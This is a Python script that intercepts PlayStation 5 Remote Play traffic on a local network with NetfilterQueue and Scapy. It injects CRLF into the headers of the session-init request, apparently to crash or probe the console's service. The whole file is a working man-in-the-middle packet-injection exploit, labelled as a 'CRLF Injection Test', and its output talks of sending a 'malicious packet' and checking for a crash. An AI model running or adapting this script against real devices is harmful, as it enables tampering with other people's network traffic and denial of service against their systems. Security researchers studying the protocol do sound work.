#!/usr/bin/env python3

import os
import sys
import re
from netfilterqueue import NetfilterQueue
from scapy.all import *

# --- Configuration ---
CLIENT_IP = "192.168.1.2"  # Adjust if needed
PS5_IP = "192.168.1.4"

# --- Flag to ensure we only attack once ---
attack_sent = False

def process_packet(packet):
    """
    Callback to inject CRLF into the FIRST /sess/init request.
    """
    global attack_sent
    
    try:
        ip_packet = IP(packet.get_payload())
    except:
        packet.accept()
        return

    # Only process TCP packets from client to server
    if not (ip_packet.haslayer(TCP) and ip_packet.src == CLIENT_IP and ip_packet.dst == PS5_IP):
        packet.accept()
        return
        
    # Find the GET /init request and ensure we haven't already attacked
    if not attack_sent and ip_packet.haslayer(Raw) and b"GET /sie/ps5/rp/sess/init" in ip_packet[Raw].load:
        print("[+] Detected GET /sess/init. Intercepting and injecting CRLF headers.")
        
        # Craft the malicious payload
        original_payload = ip_packet[Raw].load.decode('utf-8')
        
        # Inject CRLF into User-Agent and Rp-Version headers
        # This is a reliable way to test for CRLF injection
        injected_payload = original_payload.replace(
            "User-Agent: remoteplay Windows\r\n",
            "User-Agent: remoteplay Windows\r\nX-Injected: pwned\r\n"
        ).replace(
            "Rp-Version: 1.0\r\n",
            "Rp-Version: 1.0\r\nX-Exploit-Test: 1\r\n"
        )
        
        # Re-build the packet with the new payload
        # Scapy will recalculate lengths and checksums
        new_packet = IP(src=ip_packet.src, dst=ip_packet.dst) / \
                     TCP(sport=ip_packet[TCP].sport, dport=ip_packet[TCP].dport,
                         flags=ip_packet[TCP].flags,
                         seq=ip_packet[TCP].seq,
                         ack=ip_packet[TCP].ack) / \
                     bytes(injected_payload, 'utf-8')
        
        # Set the NFQUEUE verdict to the new packet's payload
        packet.set_payload(bytes(new_packet))
        print("[SUCCESS] Malicious packet sent. Check for a '200 OK -> crash' response.")
        attack_sent = True

    # Accept the modified packet (or any other packet)
    packet.accept()

def main():
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root.", file=sys.stderr)
        sys.exit(1)

    print("--- PS5 sess/init CRLF Injection Test ---")
    print("[*] Binding to NFQUEUE queue number 1...")
    
    queue = NetfilterQueue()
    queue.bind(1, process_packet)

    try:
        print("[*] Waiting for packets. Start the Remote Play connection now.")
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down. Remember to clear iptables rules.")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()
